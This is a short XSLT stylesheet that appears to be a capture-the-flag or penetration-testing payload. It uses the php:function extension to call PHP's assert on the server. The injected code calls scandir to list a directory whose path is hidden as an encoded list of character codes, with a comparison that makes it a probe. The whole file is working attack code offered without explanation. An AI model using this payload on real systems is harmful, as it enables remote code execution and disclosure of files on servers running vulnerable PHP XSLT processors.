<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
   <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
       <xsl:copy-of name="abc" select="php:function('assert','var_dump(scandir(CHAR(46, 54, 102, 102, 51, 50, 48, 48, 98, 101, 101, 55, 56, 53, 56, 48, 49, 102, 52, 50, 48, 102, 98, 97, 56, 50, 54, 102, 102, 99, 100, 101, 101, 47)))==3')" />
       <br />
   </body>
</html>
